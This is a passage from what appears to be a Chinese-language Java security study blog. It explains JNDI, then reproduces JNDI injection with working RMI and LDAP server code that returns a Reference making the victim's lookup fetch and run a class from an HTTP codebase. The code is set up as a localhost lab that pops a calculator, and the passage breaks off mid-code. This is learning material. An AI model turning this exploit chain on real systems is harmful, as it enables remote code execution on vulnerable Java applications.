class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj, obj&#125;);<br><br>        <span class="hljs-comment">// ==================</span><br>        <span class="hljs-comment">// 生成序列化字符串</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-comment">//通过 ObjectOutputStream 把构造好的 PriorityQueue 对象序列化成字节数组</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(queue);<br>        oos.close();<br><br>        <span class="hljs-keyword">return</span> barr.toByteArray();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java 学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JNDI</title>
    <link href="/2025/09/24/JNDI/"/>
    <url>/2025/09/24/JNDI/</url>
    
    <content type="html"><![CDATA[<h1 id="一、JNDI-简介"><a href="#一、JNDI-简介" class="headerlink" title="一、JNDI 简介"></a>一、JNDI 简介</h1><p>JNDI(Java Naming and Directory Interface，Java命名和目录接口) 是一个应用程序设计的 API，一种标准的 Java 命名系统接口。JNDI 提供统一的客户端 API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242106579.png"></p><table><thead><tr><th><strong><font style="color:rgb(102, 102, 102);">协议</font></strong></th><th><strong><font style="color:rgb(102, 102, 102);">作用</font></strong></th></tr></thead><tbody><tr><td><font style="color:rgb(102, 102, 102);">LDAP</font></td><td><font style="color:rgb(102, 102, 102);">轻量级目录访问协议，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容</font></td></tr><tr><td><font style="color:rgb(102, 102, 102);">RMI</font></td><td><font style="color:rgb(102, 102, 102);">JAVA 远程方法协议，该协议用于远程调用应用程序编程接口，使客户机上运行的程序可以调用远程服务器上的对象</font></td></tr><tr><td><font style="color:rgb(102, 102, 102);">DNS</font></td><td><font style="color:rgb(102, 102, 102);">域名服务</font></td></tr><tr><td><font style="color:rgb(102, 102, 102);">CORBA</font></td><td><font style="color:rgb(102, 102, 102);">公共对象请求代理体系结构</font></td></tr></tbody></table><h1 id="二、JNDI-实现"><a href="#二、JNDI-实现" class="headerlink" title="二、JNDI 实现"></a>二、JNDI 实现</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IRemoteObj</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String keywords)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, AlreadyBoundException &#123;<br>        <span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObjImpl</span>();<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        r.bind(<span class="hljs-string">&quot;remoteObj&quot;</span>, remoteObj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteObjImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IRemoteObj</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">RemoteObjImpl</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String keywords)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">upKeywords</span> <span class="hljs-operator">=</span> keywords.toUpperCase();<br>        System.out.println(upKeywords);<br>        <span class="hljs-keyword">return</span> upKeywords;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIRMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        <span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> (IRemoteObj) initialContext.lookup(<span class="hljs-string">&quot;rmi://localhost:1099/remoteObj&quot;</span>);<br>        System.out.println(remoteObj.sayHello(<span class="hljs-string">&quot;hello&quot;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIRMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        initialContext.rebind(<span class="hljs-string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObjImpl</span>());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242106238.png"></p><h1 id="三、JNDI-注入"><a href="#三、JNDI-注入" class="headerlink" title="三、JNDI 注入"></a>三、JNDI 注入</h1><h2 id="3-1-分析漏洞如何产生"><a href="#3-1-分析漏洞如何产生" class="headerlink" title="3.1 分析漏洞如何产生"></a>3.1 分析漏洞如何产生</h2><p>此处断点调试，跟进 lookup</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107810.png"></p><p>InitialContext.lookup</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107722.png"></p><p>GenericURLContext.lookup</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107072.png"></p><p>RegistryContext.lookup</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107413.png"></p><p>RegistryImpl_Stub.lookup      到这里就不用跟了，攻击方式和 RMI 中攻击注册中心一样，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107847.png"></p><blockquote><p>RMI 中的攻击注册中心：<a href="https://www.yuque.com/taohuayuanpang/qxcvxi/rzl0dhpb5pnb8noh#dT3m5">https://www.yuque.com/taohuayuanpang/qxcvxi/rzl0dhpb5pnb8noh#dT3m5</a></p></blockquote><h2 id="3-2-Jndi-RMI"><a href="#3-2-Jndi-RMI" class="headerlink" title="3.2 Jndi + RMI"></a>3.2 <font style="color:rgb(80, 80, 92);">Jndi + RMI</font></h2><h3 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h3><p> 先写一个弹出计算器类并编译：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107819.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107878.png"></p><p>之后用 python 开一个 http 服务，监听 7777 端口</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107851.png"></p><p>服务端：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIRMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br><br>        <span class="hljs-comment">//initialContext.rebind(&quot;rmi://localhost:1099/remoteObj&quot;, new RemoteObjImpl());</span><br><br><br>        <span class="hljs-comment">// 在当前 JVM 中启动（或创建）一个 RMI registry，监听端口 1099</span><br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-comment">//将 JndiCalc 类的 JndiCalc 方法，放到 http://localhost:7777/</span><br>        <span class="hljs-comment">// 创建一个 Reference 对象（指向一个可通过工厂/远程位置获取的类）</span><br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;JndiCalc&quot;</span>, <span class="hljs-string">&quot;JndiCalc&quot;</span>, <span class="hljs-string">&quot;http://localhost:7777/&quot;</span>);<br>        <span class="hljs-comment">// 将 Reference 绑定到 JNDI 命名空间中的 rmi URL 下</span><br>        initialContext.rebind(<span class="hljs-string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, reference);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107319.png"></p><p>然后用客户端访问，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIRMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        <span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> (IRemoteObj) initialContext.lookup(<span class="hljs-string">&quot;rmi://localhost:1099/remoteObj&quot;</span>);<br>        System.out.println(remoteObj.sayHello(<span class="hljs-string">&quot;hello&quot;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>弹出计算器：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242108358.png"></p><p>这个调用过程就是 3.1 中以及分析过的，实际上还是调用了 lookup 方法</p><h3 id="调试："><a href="#调试：" class="headerlink" title="调试："></a>调试：</h3><p>在客户端的 lookup 处断点</p><p>跟到 RegistryImpl_Stub 这里，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242108548.png"></p><p>继续跟进</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242108935.png"></p><p>这里看到 var2 被赋值了 ，这里的 var2 是一个对象变量，Ref 将值传递给了它</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242108230.png"></p><p>步入 decodeObject ，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242108027.png"></p><p><font style="color:rgb(80, 80, 92);">先做了一个简单的判断，判断是否为 </font><code>ReferenceWrapper</code>，也就是判断是否为 <code>Reference</code> 对象</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242109861.png"></p><p>继续跟进 getObjectInstance</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242109168.png"></p><p>这里使用强转将 refInfo 转为 Reference </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242110137.png"></p><p><font style="color:rgb(80, 80, 92);">继续往下走，</font><font style="color:rgb(83, 83, 96);">getObjectFactoryBuilder() 这里获取到了恶意类</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242110090.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242110041.png"></p><p><font style="color:rgb(80, 80, 92);">继续往下走，获取到 codebase，并且进行 helper.loadClass()</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242110781.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242110428.png"></p><p>来到 newInstance() 后会调用 JndiCalc 类执行代码</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242110895.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242110953.png"></p><h2 id="3-2-Jndi-LDAP"><a href="#3-2-Jndi-LDAP" class="headerlink" title="3.2 Jndi + LDAP"></a>3.2 Jndi + LDAP</h2><h3 id="LDAP-简介"><a href="#LDAP-简介" class="headerlink" title="LDAP 简介"></a>LDAP 简介</h3><p>Lightweight Directory Access Protocol （轻量级目录访问协议）是一种开放的、与供应商无关的行业标准应用协议， 用于通过互联网协议(IP) 网络访问和维护分布式目录信息服务。目录服务在开发内联网和互联网应用程序中发挥着重要作用，因为它允许在整个网络中共享有关用户、系统、网络、服务和应用程序的信息。例如，目录服务可以提供任何有组织的记录集，通常具有层次结构，例如公司电子邮件目录。同样，电话簿是包含地址和电话号码的用户列表。</p><h3 id="LDAP-身份验证的基本流程："><a href="#LDAP-身份验证的基本流程：" class="headerlink" title="LDAP 身份验证的基本流程："></a><font style="color:rgb(25, 27, 31);">LDAP 身份验证的基本流程：</font></h3><ol><li><strong><font style="color:rgb(25, 27, 31);">用户提供凭证</font></strong><font style="color:rgb(25, 27, 31);">：用户通过客户端应用（如数据库客户端）输入用户名和密码。</font></li><li><strong><font style="color:rgb(25, 27, 31);">客户端与 LDAP 服务器通信</font></strong><font style="color:rgb(25, 27, 31);">：客户端通过 LDAP 协议与 LDAP 服务器通信，将用户名和密码发送给 LDAP 服务器。</font></li><li><strong><font style="color:rgb(25, 27, 31);">LDAP 服务器验证</font></strong><font style="color:rgb(25, 27, 31);">：LDAP 服务器检查用户名是否存在，并对密码进行验证。</font></li><li><strong><font style="color:rgb(25, 27, 31);">返回验证结果</font></strong><font style="color:rgb(25, 27, 31);">：如果用户名和密码匹配，LDAP 服务器返回认证成功的信息，允许用户访问资源。否则，返回认证失败。</font></li></ol><p><font style="color:rgb(25, 27, 31);">LDAP 支持多种认证方式，如：</font></p><ul><li><strong>匿名认证</strong><font style="color:rgb(25, 27, 31);">：不需要提供凭证，但访问权限有限。</font></li><li><strong>简单认证</strong><font style="color:rgb(25, 27, 31);">：用户提供用户名和密码进行身份验证。</font></li><li><strong>SASL</strong>（简单认证和安全层）认证：用于更复杂的认证机制，提供更高的安全性。</li></ul><h3 id="LDAP-目录服务的常用结构"><a href="#LDAP-目录服务的常用结构" class="headerlink" title="LDAP 目录服务的常用结构"></a><font style="color:rgb(25, 27, 31);">LDAP 目录服务的常用结构</font></h3><p><font style="color:rgb(25, 27, 31);">LDAP 目录中的信息组织为树形结构，称为 </font><strong><font style="color:rgb(25, 27, 31);">目录信息树（DIT）</font></strong><font style="color:rgb(25, 27, 31);">。常见的条目包括用户、组织、</font>部门等。条目使用 Distinguished Name (DN) 进行标<font style="color:rgb(25, 27, 31);">识，DN 包括所有节点的完整路径。例如，一个用户条目的 DN 可能是：</font></p><p><code>uid=john,ou=users,dc=example,dc=com</code></p><p><font style="color:rgb(25, 27, 31);">其中：</font></p><ul><li><code>uid=john</code><font style="color:rgb(25, 27, 31);"> </font><font style="color:rgb(25, 27, 31);">表示用户名为 john。</font></li><li><code>ou=users</code><font style="color:rgb(25, 27, 31);"> </font><font style="color:rgb(25, 27, 31);">表示该条目属于“users”组织单元。</font></li><li><code>dc=example,dc=com</code>表示 LDAP 服务器的域名是 <code>example.com</code>。</li></ul><h3 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>导入<code>unboundid-ldapsdk</code> 的依赖。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.unboundid<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="Ldap-服务端："><a href="#Ldap-服务端：" class="headerlink" title="Ldap 服务端："></a>Ldap 服务端：</h4><h5 id="代码搭建"><a href="#代码搭建" class="headerlink" title="代码搭建"></a>代码搭建</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPException;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LdapServer</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//此处的 url 表示返回给客户端的 codebaseURL (http://127.0.0.1:8000)</span><br>        <span class="hljs-comment">//格式为：http://127.0.0.1:port/#Refname；</span><br>        <span class="hljs-comment">//Refname 就是要加载的类，port 为 http 监听的端口</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8000/#JndiCalc&quot;</span>;<br>        <span class="hljs-comment">//ldap 服务监听的端口，客户端连接这个端口执行 lookup</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">1234</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//配置 LDAP 监听器</span><br>            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);<br>            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<br>                <span class="hljs-string">&quot;listen&quot;</span>,<br>                InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),<br>                port,<br>                ServerSocketFactory.getDefault(),<br>                SocketFactory.getDefault(),<br>                (SSLSocketFactory) SSLSocketFactory.getDefault()));<br><br>            <span class="hljs-comment">//注册拦截器，该拦截器在收到 search 操作时会被调用，可以自定义返回的 entry ；正是实现“返回恶意 LDAP 引用”的地方。</span><br>            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url)));<br>            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);<br>            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port);<br>            ds.startListening();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br>        <span class="hljs-keyword">private</span> URL codebase;<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * */</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span> <span class="hljs-params">( URL cb )</span> &#123;<br>            <span class="hljs-built_in">this</span>.codebase = cb;<br>        &#125;<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &#123;<span class="hljs-doctag">@inheritDoc</span>&#125;</span><br><span class="hljs-comment">         * * <span class="hljs-doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span><br><span class="hljs-comment">         */</span> <span class="hljs-meta">@Override</span><br>        <span class="hljs-comment">//当 LDAP 客户端做 search/lookup 时触发</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result )</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);<br>            <span class="hljs-keyword">try</span> &#123;<br>                